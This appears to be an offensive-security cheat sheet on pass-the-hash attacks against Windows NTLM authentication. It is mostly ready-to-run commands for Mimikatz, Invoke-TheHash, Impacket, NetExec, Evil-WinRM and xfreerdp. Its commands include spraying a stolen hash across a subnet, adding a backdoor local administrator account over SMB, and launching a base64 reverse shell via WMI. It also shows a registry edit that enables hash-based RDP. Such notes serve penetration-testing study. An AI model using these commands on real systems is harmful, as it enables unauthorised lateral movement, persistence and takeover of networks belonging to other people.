**Overview:**
- PtH abuses NTLM authentication by using a password hash directly instead of the plaintext password. The hash acts as the credential. No decryption is needed.
- The hash remains valid for authentication until the account password is changed. A single compromised hash can provide persistent access across the domain.
- Hashes can be sourced from SAM dumps, LSASS memory, or NTDS.dit. See `04-post-exploitation/windows privilege escalation/credential theft/` and `03-exploitation/active directory exploitation/NTDS.dit.md`.
- Local admin PtH is blocked by UAC token filtering unless the account is the built-in Administrator (RID-500), or `LocalAccountTokenFilterPolicy` is set to `1`. Domain admin accounts are not affected by this restriction.
- MITRE ATT&CK: T1550.002
---
## Mimikatz

> Run on the Windows host.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<NThash> /domain:<domain> /run:cmd.exe" exit
```

Spawns a process in the context of the target user using their NTLM hash. `/rc4` and `/NTLM` are interchangeable. Use the computer name or `.` in place of `/domain` for local accounts.

---
## Invoke-TheHash

> Run on the Windows host.

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <target> -Domain <domain> -Username <user> -Hash <NThash> -Command "net user <user> <password> /add && net localgroup administrators <user> /add" -Verbose
```

Executes a command on the target via SMB using a hash. Useful for adding a local admin account without needing a shell first.

**Reverse Shell**

```powershell
Invoke-WMIExec -Target <target> -Domain <domain> -Username <user> -Hash <NThash> -Command "<base64 reverse shell payload>"
```

Start a listener, execute a command via WMI. Use the machine name instead of the IP when targeting by hostname. Generate the payload at revshells.com (PowerShell Base64). 

---
## Impacket

> Run on the Linux host.

```bash
impacket-psexec <user>@<target> -hashes :<NThash>
```

Executes commands on the target via SMB/PsExec using a hash. LM portion can be left empty (`:NThash` format).

---
## NetExec

> Run on the Linux host.

```bash
netexec smb <target/subnet> -u <user> -d <domain> -H <NThash>
```

Sprays a hash across a subnet. `Pwn3d!` in output indicates local admin access on that host. Use `-x <command>` to execute commands on matching hosts. Add `--local-auth` to authenticate as a local account instead of a domain account.

---
## Evil-WinRM

> Run on the Linux host.

```bash
evil-winrm -i <target> -u <user> -H <NThash>
```

Opens a WinRM session using a hash. Requires WinRM to be accessible on the target.

---
## RDP

> Run on the Windows target first, then the Linux attack host.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Enables Restricted Admin Mode on the target. Required for hash-based RDP authentication.

```powershell
xfreerdp /v:<target> /u:<user> /pth:<NThash>
```

Opens an RDP session using a hash via Restricted Admin Mode.